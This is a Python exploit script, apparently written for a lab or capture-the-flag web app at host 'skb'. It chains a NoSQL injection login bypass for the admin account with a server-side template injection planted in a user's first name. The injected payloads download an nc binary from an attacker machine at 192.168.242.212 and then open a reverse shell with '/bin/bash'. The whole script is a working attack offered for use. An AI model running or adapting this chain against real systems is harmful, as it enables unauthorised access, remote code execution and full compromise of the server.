import requests
import json
import random
import string

def generateRandomUsername(length=16):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def visitAdminDashboard(token):
    admin_dashboard = "http://skb:80/admin/users"
    burp0_headers = {"Authorization": "Bearer " + token, "Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://skb/admin", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    requests.get(admin_dashboard, headers=burp0_headers)

def exploitSSTIStages(payload, user_data, token):
    upload = "http://skb:80/api/admin/users"

    upload_json ={"balance": 0, "firstName": "{{['" + payload + "']|filter('system')}}", "identityNumber": user_data, "lastName": user_data, "password": user_data, "role": "user", "username": user_data}
    res = requests.post(upload, headers=auth_header, json=upload_json)

    visitAdminDashboard(token)
    return res

login_url = "http://skb:80/api/login"
login_json = {"password": {"$ne": ""}, "username": "admin"}

login_response = requests.post(login_url, json=login_json).text
print("[NoSQL Injection] Login success.")

token = json.loads(login_response)["token"]
auth_header = {"Authorization": "Bearer " + token}
print("[NoSQL Injection] Got token:", token)

print("[SSTI] Waiting to your http server in 192.168.242.212:9000, python -m http.server 9000 --bind=0.0.0.0")
input("Press Enter to continue...")

user_data = generateRandomUsername()
res = exploitSSTIStages("curl -o nc http:\/\/192.168.242.212:9000\/nc; chmod +x nc", user_data, token)

print("[SSTI] You can close your http server")
print("[SSTI] Downloaded nc binary")

created_user_id = json.loads(res.text)["user"]["id"]
delete_user_url = f"http://skb:80/api/admin/users/{created_user_id}"
requests.delete(delete_user_url, headers=auth_header)
print("[SSTI] Deleted user:", created_user_id)

print("[SSTI] Waiting to your nc server, nc -lvnp 9090")
input("Press Enter to continue...")

exploitSSTIStages("./nc 192.168.242.212 9090 -e /bin/bash", user_data, token)

input("Check your nc shell.")
